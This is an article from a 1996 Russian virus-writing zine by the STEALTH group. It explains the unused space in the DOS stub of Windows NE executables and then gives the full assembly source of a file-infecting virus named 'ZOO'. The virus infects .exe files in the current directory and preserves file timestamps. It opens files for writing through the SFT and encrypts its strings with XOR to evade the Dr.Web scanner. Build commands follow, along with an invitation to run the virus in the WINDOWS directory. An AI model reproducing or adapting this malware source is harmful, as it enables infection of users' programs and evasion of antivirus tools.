COMMENT *
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 10, Kiev 148, Ukraine       IV   1996
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ █▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ █ █ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄█ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.


               Рад приветствовать тебя еще раз, уважаемый читатель!
 Как-то на прошлой неделе сидел я в ДОС-сессии в ср@#ом каталоге
 гнусного ВиНd0Yz, курил и, следуя своим извращенческим привычкам,
 решил F3 на exeшниках понажимать. Нажал на первом - чуть не
 офигел. Нажал на втором, потом на третьем... :-[  ] Нет, не
 гнусный вирус робко прятал тело свое маленькое в этих exeшниках,
 а возмутила меня расточительность компании МiК┌О$0ф┼ - на ассемб-
 лерную программу, выдающую на экран строку 'This program requires
 Microsoft Windows.', эти сволочи потратили не 90 байт (в EXE-формате),
 а целый 1 К!
      В дальнейшем рассматривая NEшки (в смысле New Executable), я
 обнаружил, что компиляторы фирмы Borland такой дырки не оставляют.
 Я, соответственно, тут же решил попробовать пожить в этом килобайте
 (зачем нашару столько места пропадает? ;-) Что из этого получилось -
 смотрите ниже. Для начала немного пройдемся по этому "левому"
 килобайту. Для винды из всего килобайта важны только три условия:
 по смещению 400h должен стоять заголовок виндовой проги, а именно
 'NE', в начале проги по смещению 0h - 'MZ' и по смещению 3bh пять
 байт - 00h, 00h, 04h, 00h, 00h. Нафига они там нужны я так и не
 понял, но без них винда считает, что exeшник является ДОС-приложе-
 нием. Повторюсь, это не правило, эта фигня присутствует только
 в exeшниках, имеющих 'NE' по смещению 400h (во всяком случае
 других вариантов дос-программы с 'NE' по 400h я не нашел).
 Вот, собственно, дизассемблированный участок этой самой
 дос-программы. Места, не несущие смысловой нагрузки, я
 оттуда выкинул.

 00000000 dec bp ; 'M' сигнатура
 00000001 pop dx ; 'Z' EXE-файла
 ..................
 0000003B add [bx][si],al ; это те самые пять байт:
 0000003D add al,0h       ; 00h, 00h, 04h, 00h, 00h
 0000003F db 0h
 ..................
 00000200 call 00000256   ; вызов процедуры, находящейся по смещению 256h
 со смещения 200h, собственно, и начинается исполнение этой бадяги :)
 00000203 db 'This program requires Microsoft Windows.', 0dh, 0ah, '$'
 0000022E db 28h dup (20h) ; к чему здесь 40 штук пробелов, я так и
                             не понял :(
 00000256 pop dx
 00000257 push cs
 00000258 pop ds           ; ds теперь = cs
 00000259 mov ah,09h ; вывод фразы win
 0000025B int 21h
 0000025D mov ax,4c01h ; выход в ДОС с errorlevel = 1
 00000260 int 21h
 ..................
 00000400 dec si ; 'N' сигнатура
 00000401 inc bp ; 'E' Windows New EXE

 Со смещения 40h по 200h и с 252h по 400h - сплошные нули.
 Итого, для жизни остается 400h - 20h (20h на EXE-header) - 3Ah
 (это на вывод фразы, фразу и выход в ДОС) = 934 байта. Мне
 хватило 383 байт, учитывая текстовые фразы в теле и
 неоптимизированный код. Неиспользованым остался 551 байт -
 можно поэму еще засунуть при желании ;-)
   Теперь немного о том, что же этот ZOO делает. Ищет в текущем
 каталоге NE-файлы и вписывается в дос-программу. Затем выдает
 строку про то, как ошибся юзер, запустив сей файл под досом
 ('This program...') и выходит в ДОС. Нужный NE-EXE определяет по
 трем признакам: 1) расширение .exe ;) 2) по смещению 400h 'NE'
 3) по смещению 200h 'шS', то бишь вышеописанный call. Только
 тогда он считает, что попал, куда нужно и совершает
 вышеописанные действия. Естветсвенно, нерезидент - для
 таких целей резидент был бы просто лишним наворотом.
 Но можно подключить в RCE механизм заражения сиих
 файлов и тем самым продлевать свое существования и удивлять
 юзера, выскакивая оттуда, где он нас совсем не ожидает. Тем
 более что места предостаточно, и длина программы не увеличи-
 вается.
   Теперь немного текста для желающих сей ZOO запустить и потестировать
 на своей машине.
    Компилить исходник нужно следующим образом:
    TASM.EXE ZOO.ASM /M2 (два прохода)
    TLINK.EXE ZOO.OBJ /T
 Должен получиться .com на 383 байта. Мувите то, что получилось,
 в каталог WINDOWS, запускаете и наслаждаетесь! ;-) 
\\ *

.model tiny
.code
org 100h
start:
        mov ah,4eh      ; начинаем поиск жертв
search:
        mov cx,06h
        mov si,offset fmask
        call @xor       ; раскриптуем строку '*.exe', 0h
        mov cx,20h
        int 21h
        jnc est_eshe_poroh_v_porohovnitsah
        call quit       ; увы, больше exeшников нет
est_eshe_poroh_v_porohovnitsah:
        mov cx,06h
        jmp obmanem_etu_sranuyu_windu
        nop             ; следующие три строки - те самые пять байт
        add [bx][si],al ; 00h, 00h
        add al,00h      ; 04h, 00h
        db 00h          ; 00h
obmanem_etu_sranuyu_windu:
        mov si,offset fmask
        call @xor       ; закриптуем маску обратно
        call savtim     ; дату/время сохраним
        cmp word ptr ds:[9ah], virlen
        jbe findnext    ; какой же NE-exe будет меньше длины виря?
        mov dx,9eh
        call open       ; открываем на чтение
        jc findnext     ; ошибки... :(
        xchg ax,bx      ; хэндл файла
        call fopen_via_sft ; а вот теперь открываем на запись :)
        mov dx,400h
        call seek       ; указатель на 400h
        call compare
        cmp word ptr ds:[slovo],'EN' ; Это NE-exe?
        jnz close       ; увы, нет
        mov dx,200h
        call seek
        call compare
        cmp word ptr ds:[slovo],'Sш' ; а точно это NE-exe?
        ; 'шS' в девственном NE-exe есть код call'а на вывод фразы
        ; 'This...' и выход в ДОС
        jnz close
        mov dx,20h
        call seek
        call compare
        cmp word ptr ds:[slovo],04eb4h ; а может мы тут уже были?
        jz close
        xor dx,dx
        call seek
        mov ah,40h      ; ну раз не было еще нас здесь, тогда будем
        mov dx,offset mz ; организуем новый заголовок EXE-файла
        mov cx,20h
        int 21h
        mov ah,40h    ; ну и запишемся сами
        mov cx,virlen
        mov dx,100h
        int 21h
close:
        call resttim    ; время восстановим
        call @close     ; ну и файлик закроем
findnext:
        mov ah,4fh      ; и опять - к следующей жертве
        jmp search

;;;;;; а это пошли процедурины

fopen_via_sft:
        push bx
        push es
        push di
        mov ax,1220h
        push ax
        int 2fh
        mov bl, byte ptr es:[di]
        pop ax
        sub al,0ah
        int 2fh
        mov word ptr es:[di+02h],02h
        pop di
        pop es
        pop bx
        ret

@xor:
        push ax
        in al,42h ; это прикол для wEb'А - чтобы он не кричал EXE.Virus
        mov ah,al
        in al,42h
        cmp al,ah
        jnz @web_idiot
        ret
@web_idiot:
        pop ax
        push si
@@xor:
        xor byte ptr [si],0dbh
        inc si
        loop @@xor
        pop dx
        ret

seek:
        xor cx,cx
        mov ax,4200h
        int 21h
        ret

open:
        mov ax,3d00h
        int 21h
        ret

savtim:
        mov ax, word ptr ds:[96h]
        mov word ptr ds:[ftime], ax
        mov ax, word ptr ds:[98h]
        mov word ptr ds:[ftime+02h], ax
        ret

resttim:
        mov ax,5701h
        mov cx, word ptr ds:[ftime]
        mov dx, word ptr ds:[ftime+02h]
        int 21h
        ret

@close:
        mov ah,3eh
        int 21h
        ret

compare:
        mov cx,02h
        mov ah,3fh
        mov dx,offset slovo
        int 21h
        ret

mz      db 'M'
        db 'Z'
        db 9fh, 01h, 01h
        db 03h dup (0h)
        db 02h
        db 03h dup (0h)
        db 0ffh, 0ffh, 0f0h, 0ffh
        db 05h dup (0h)
        db 01h, 0f0h, 0ffh
        db 1ch
        db 07h dup (0h)
        ; это Дос-EXE header, который мы меняем NE-программам

fmask   db '*' xor 0dbh
        db '.' xor 0dbh
        db 'e' xor 0dbh
        db 'x' xor 0dbh
        db 'e' xor 0dbh
        db 0h  xor 0dbh
        ; сие есть шифрованная строка '*.exe',0h - понятно для чего

win     db 'T' xor 0dbh, 'h' xor 0dbh, 'i' xor 0dbh, 's' xor 0dbh
        db 20h xor 0dbh, 'p' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh
        db 'g' xor 0dbh, 'r' xor 0dbh, 'a' xor 0dbh, 'm' xor 0dbh
        db 20h xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh, 'q' xor 0dbh
        db 'u' xor 0dbh, 'i' xor 0dbh, 'r' xor 0dbh, 'e' xor 0dbh
        db 's' xor 0dbh, 20h xor 0dbh, 'M' xor 0dbh, 'i' xor 0dbh
        db 'c' xor 0dbh, 'r' xor 0dbh, 'o' xor 0dbh, 's' xor 0dbh
        db 'o' xor 0dbh, 'f' xor 0dbh, 't' xor 0dbh, 20h xor 0dbh
        db 'W' xor 0dbh, 'i' xor 0dbh, 'n' xor 0dbh, 'd' xor 0dbh
        db 'o' xor 0dbh, 'w' xor 0dbh, 's' xor 0dbh, '.' xor 0dbh
        db 0dh xor 0dbh, 0ah xor 0dbh, '$' xor 0dbh
end_win:
        ; ну это даже об'яснять не надо :) - это мы ВиНd0Yz хотим

author  db '(' xor 0dbh, 'c' xor 0dbh, ')' xor 0dbh
        db 20h xor 0dbh, 'D' xor 0dbh
        db 'N' xor 0dbh, 'a' xor 0dbh, 'z' xor 0dbh, 'i' xor 0dbh
        ; это строка '(c) DNazi', то бишь указание авторства

zoo     db 'М' xor 0dbh, 'ы' xor 0dbh, 20h xor 0dbh
        db 'у' xor 0dbh, 'й' xor 0dbh, 'д' xor 0dbh, 'е' xor 0dbh
        db 'м' xor 0dbh, 20h xor 0dbh, 'и' xor 0dbh, 'з' xor 0dbh
        db 20h xor 0dbh, 'з' xor 0dbh, 'о' xor 0dbh, 'о' xor 0dbh
        db 'п' xor 0dbh, 'а' xor 0dbh, 'р' xor 0dbh, 'к' xor 0dbh
        db 'а' xor 0dbh, '!' xor 0dbh
        ; А это собственно ключевая строка в вирусе - его название
        ; 'Мы уйдем из зоопарка!'

quit:   ; выход он и в Африке выход
        mov cx,end_win - win
        mov si,offset win
        call @xor
        mov ah,09h ; Выводим просьбу,
                   ; чтобы нас под виндой другой раз пускали
        int 21h
        mov ax,4c01h    ; ну и к папе-ДОСу вернемся
        int 21h
slovo  equ 0f000h ; это просто word для данных
ftime  equ slovo - 04h ; а это для даты/времени
virlen equ $ - start ; сие есть наша длина
end start

                                                (c) Dirty Nazi 1996